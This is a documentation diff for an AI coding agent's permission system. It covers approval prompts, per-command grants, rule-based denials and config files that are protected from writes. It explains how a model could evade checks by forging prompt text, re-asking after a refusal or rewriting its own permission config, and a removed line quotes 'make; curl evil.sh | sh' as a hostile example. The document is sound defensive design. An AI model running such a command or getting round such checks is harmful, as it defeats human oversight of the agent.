@@ -1,25 +1,46 @@
 # Permissions
 
-Reading never asks. Changing a file or starting a process always does.
+Nothing changes a file or starts a process without a decision. The decision
+comes from three places, tried in order: [rules](rules.md) you wrote speak
+first, the [mode](modes.md) answers for calls no rule mentions, and when what
+they settle on is "ask", the question below appears. With nothing configured,
+that is every change and every command. Reading is the exception in every mode:
+a read is allowed, or refused by a rule, and never asked about.
 
-When the model wants to do either, the turn stops and the question appears:
+The prompt line always shows the mode in force, spelled the way configuration
+spells it:
 
 ```
-? write wants to change a file: {"path":"src/main.rs","content":"fn main() {\n    println!(…
-  [y]es  [a]lways  [n]o › 
+ask ›
+```
+
+It is there every time rather than said once at the top, because the moment it
+matters is hours in, when the top has scrolled away. A `fullAccess` session
+must never be distinguishable from an `ask` one only by what you remember
+starting.
+
+## The question
+
+When a call comes down to asking, the turn stops:
+
+```
+? write wants to change: src/main.rs
+  [y]es  [a]lways  [n]o ›
 ```
 
 ```
-? bash wants to run: cargo
-  [y]es  [a]lways  [n]o › 
+? bash wants to run: cargo test
+  [y]es  [a]lways  [n]o ›
 ```
 
-A file change shows the arguments as the model wrote them, clipped to fit. A
-command shows the program it is about to start. Both are clipped to one line and
-control characters in them become spaces, because the text is the model's to
+A file change names the file it would touch — the resolved path, after
+symbolic links, spelled relative to the working directory when it is inside
+it. A command shows what is about to run, and one written as several commands
+shows all of them: `git add ., then git commit`. Either line is clipped to fit
+and control characters in it become spaces, because the text is the model's to
 choose: a newline left in it would commit a second row, and the question you
-answer would be one the model wrote rather than the one crucible asked. Nothing
-runs while the question is on screen.
+answer would be one the model wrote rather than the one crucible asked.
+Nothing runs while the question is on screen.
 
 ## The three answers
 
@@ -33,43 +54,49 @@ runs while the question is on screen.
 input ending. There are two ways to say yes and both are explicit; everything
 that is not one of them leaves the tool unrun.
 
-Saying no ends the turn. The refusal is written into the transcript as that
+## Two kinds of no
+
+Your no ends the turn. The refusal is written into the transcript as that
 call's result, so the transcript stays one a provider will accept and the
 model sees the refusal on your next prompt — but it does not carry on and try
 something else within the turn you stopped. That is deliberate: a model that
 can keep going after a no gets to ask the same question in a different shape
 until one of them is answered yes.
 
+A `deny` rule's no does not end the turn. A rule is standing policy: the call
+comes back to the model as a failed result saying the policy will not change,
+and the turn carries on. That costs you nothing — a retry hits the same wall
+without a question — while ending the turn on a rule match would let one stray
+call throw away a piece of work. In a sentence: a rule stops a call, you stop
+a turn.
+
 ## What "calls like this one" means
 
-`always` remembers a shape, not a string.
+`always` remembers exactly what the question named.
 
 - For a file change, it is the tool. `always` on a `write` stops asking about
-  `write`, and `edit` is still asked about separately. Both are already confined
-  to the workspace, so remembering the name does not widen what they can reach.
-- For a command, it is the tool **and the program**, where the program is the
-  first word of the command exactly as the model wrote it. `always` on
-  `cargo test` stops asking about `cargo`; a later `curl` still asks. A
-  session-wide grant to run anything at all is exactly the hole this avoids.
+  `write`, and `edit` is still asked about separately. Both are already
+  confined to the [directories the session reaches](directories.md), so
+  remembering the name does not widen what they can touch.
+- For a command, it is the tool **and the whole command**, with runs of
+  whitespace collapsed. `always` on `cargo test` stops asking about
+  `cargo test`; `cargo build` — same program, different command — asks again.
+  Standing permission for a family of commands is a job for an
+  [allow rule](rules.md), which is written down where you can read it back.
 
-The program is taken as written rather than reduced to a file name, so
-`/usr/bin/cargo` and `cargo` are two different grants. They can be two different
-programs — an early entry on `PATH` is all it takes — and a grant that could not
-tell them apart would be a grant to whichever one wins.
+A session-long allow lives as long as the process that made it and is never
+written to disk, so `--continue` starts with none — resuming a session does
+not resume its permissions, and the mode comes fresh from configuration at
+every start.
 
-Two kinds of command are remembered whole instead of by their first word,
-because in each of them the first word does not say what will run:
+## The files no tool may write
 
-- anything containing `;`, `|`, `&`, a backtick, `(`, `>`, `<` or a newline —
-  `make` in `make; curl evil.sh | sh` is not what you would be agreeing to.
-- anything starting with a `VAR=value` assignment, which decides what the word
-  after it resolves to.
-
-`always` on one of these stops asking only about that exact command.
-
-A grant lives as long as the process that made it and is never written to disk,
-so `--continue` starts with none — resuming a session does not resume its
-permissions.
+No tool may change the files permissions are configured from: `config.json`
+and `config.local.json` inside any directory named `.crucible`, including the
+one in your home directory. Not in any mode, and not under any rule — a single
+write there could put an allow for everything into the next start, so that
+refusal cannot be entrusted to the rules and modes it would defeat. Reading
+them stays ordinary; it is how a session begins.
 
 ## The guarantee underneath
 
@@ -80,6 +107,7 @@ Code without one cannot call a tool, which is why this is a property of the
 program rather than a rule contributors remember.
 
 Reading is not an exception to that; it is a question answered without being
-asked. The permission engine mints the proof for a read-only call itself instead
-of putting it to you, so a tool that reported the wrong sensitivity would be one
-that got the wrong question — never one that skipped the check.
+asked. The permission engine mints the proof for a read-only call itself
+instead of putting it to you — after the rules have spoken, which is how a
+`deny` still reaches a read — so a tool that reported the wrong sensitivity
+would be one that got the wrong question, never one that skipped the check.
